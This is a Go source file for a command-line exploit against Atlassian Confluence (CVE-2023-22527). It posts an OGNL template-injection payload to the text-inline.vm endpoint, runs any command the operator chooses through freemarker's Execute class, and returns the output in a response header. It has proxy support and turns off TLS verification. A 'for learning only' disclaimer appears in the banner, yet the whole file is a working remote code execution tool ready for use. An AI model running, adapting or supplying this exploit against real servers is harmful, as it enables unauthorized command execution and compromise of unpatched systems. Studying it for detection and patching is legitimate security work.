package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/charmbracelet/log"
	"github.com/go-resty/resty/v2"
	"os"
	"time"
)

var (
	PROXIES string
	logger  *log.Logger
)

func init() {
	logger = log.NewWithOptions(os.Stderr, log.Options{
		Level:           log.InfoLevel,
		ReportCaller:    false,
		ReportTimestamp: true,
		TimeFormat:      time.DateTime,
		CallerOffset:    1,
	})
}

func banner() {
	fmt.Println(`
	
	 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗ ██████╗ ███████╗██████╗ ███████╗
	██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗╚════██╗██╔════╝╚════██╗╚════██║
	██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝ █████╔╝███████╗ █████╔╝    ██╔╝
	██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝██╔═══╝ ██╔═══╝ ╚════██║██╔═══╝    ██╔╝ 
	╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝      ███████╗███████╗███████║███████╗   ██║  
	 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚══════╝╚══════╝╚══════╝╚══════╝   ╚═╝  
																												
	@Auth: C1ph3rX13
	@Blog: https://c1ph3rx13.github.io
	@Note: Atlassian Confluence - Remote Code Execution (CVE-2023-22527)
	@Warn: 代码仅供学习使用，请勿用于其他用途
	`)
}

func clientConfigs() *resty.Client {
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}

	client := resty.New().
		SetHeaders(headers).
		SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).
		SetTimeout(10 * time.Second).
		SetRedirectPolicy(resty.FlexibleRedirectPolicy(10))

	if PROXIES != "" {
		client.SetProxy(PROXIES)
	}

	return client
}

func exp(target, cmd string, client *resty.Client) {
	url := fmt.Sprintf("%s/template/aui/text-inline.vm", target)
	payload := fmt.Sprintf(`label=\u0027\u002B#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})\u002B\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"%s"}))`, cmd)

	resp, err := client.R().
		SetBody(payload).
		Post(url)
	if err != nil {
		logger.Fatalf("Request Error: %v", err)
	}

	if resp.IsSuccess() && resp.RawResponse.Header.Get("X-Cmd-Response") != "" {
		result := resp.RawResponse.Header.Get("X-Cmd-Response")
		logger.Infof("[+] RCE Result: %s", result)
	} else {
		logger.Fatalf("[-] Not Vulnerable: %s", url)
	}
}

func main() {
	banner()
	target := flag.String("t", "", "Target Url")
	cmd := flag.String("c", "", "Command")
	proxy := flag.String("p", "", "Proxy Url")

	flag.Parse()

	if *target == "" {
		log.Error("Missing required arguments.")
		flag.Usage()
		return
	}

	if *proxy != "" {
		PROXIES = *proxy
	}

	client := clientConfigs()
	exp(*target, *cmd, client)
}
